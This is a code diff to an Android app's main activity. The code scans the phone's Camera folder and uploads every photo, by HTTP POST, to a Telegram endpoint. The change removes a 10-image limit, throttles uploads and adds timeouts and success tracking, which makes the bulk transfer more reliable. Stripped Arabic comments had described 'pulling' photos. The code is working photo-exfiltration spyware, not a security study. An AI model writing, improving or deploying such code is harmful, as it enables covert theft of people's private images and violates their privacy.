@@ -82,37 +82,34 @@ public class MainActivity extends Activity {
             String[] projection;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 projection = new String[]{
-                    MediaStore.Images.Media._ID, 
-                    MediaStore.Images.Media.RELATIVE_PATH, 
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.RELATIVE_PATH,
                     MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                 };
             } else {
                 projection = new String[]{
-                    MediaStore.Images.Media._ID, 
+                    MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DATA
                 };
             }
-            
+
             String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
             Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
 
             if (cursor != null) {
-                int count = 0;
-                int maxImages = 10; // عدد الصور التي سيتم سحبها
-                
                 int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int sentCount = 0;
 
-                while (cursor.moveToNext() && count < maxImages) {
+                while (cursor.moveToNext()) {
                     boolean isCamera = false;
-                    
+
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                         int pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH);
                         int bucketIndex = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
-                        
+
                         String path = pathIndex != -1 ? cursor.getString(pathIndex) : "";
                         String bucket = bucketIndex != -1 ? cursor.getString(bucketIndex) : "";
-                        
-                        // التحقق من أن الصورة داخل مجلد الكاميرا
+
                         if ((path != null && path.contains("Camera")) || (bucket != null && bucket.toLowerCase().contains("camera"))) {
                             isCamera = true;
                         }
@@ -123,24 +120,39 @@ public class MainActivity extends Activity {
                             isCamera = true;
                         }
                     }
-                    
-                    // إذا كانت الصورة من الكاميرا، قم بإرسالها
+
                     if (isCamera) {
                         int id = cursor.getInt(idIndex);
                         Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
 
                         try {
                             Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
-                            sendPhotoToTelegram(bitmap);
-                            count++;
+                            if (bitmap != null) {
+                                boolean ok = sendPhotoToTelegram(bitmap);
+                                bitmap.recycle();
+                                if (ok) {
+                                    sentCount++;
+                                    publishProgress(sentCount);
+                                }
+                            }
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
+
+                        try {
+                            Thread.sleep(300);
+                        } catch (InterruptedException ignored) {}
                     }
                 }
                 cursor.close();
             }
             return null;
+        }
+
+        @Override
+        protected void onProgressUpdate(Integer... values) {
+            super.onProgressUpdate(values);
+            Toast.makeText(MainActivity.this, "Sent: " + values[0] + " images", Toast.LENGTH_SHORT).show();
         }
 
         @Override
@@ -150,7 +162,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    private void sendPhotoToTelegram(Bitmap bitmap) {
+    private boolean sendPhotoToTelegram(Bitmap bitmap) {
         String boundary = "*****";
         String lineEnd = "\r\n";
         String twoHyphens = "--";
@@ -161,6 +173,8 @@ public class MainActivity extends Activity {
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
 
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
 
@@ -173,7 +187,7 @@ public class MainActivity extends Activity {
             request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
 
             ByteArrayOutputStream stream = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
             request.write(stream.toByteArray());
             request.writeBytes(lineEnd);
             request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
@@ -182,8 +196,11 @@ public class MainActivity extends Activity {
             request.close();
 
             int responseCode = conn.getResponseCode();
+            conn.disconnect();
+            return responseCode == 200;
         } catch (Exception e) {
             e.printStackTrace();
+            return false;
         }
     }
 }
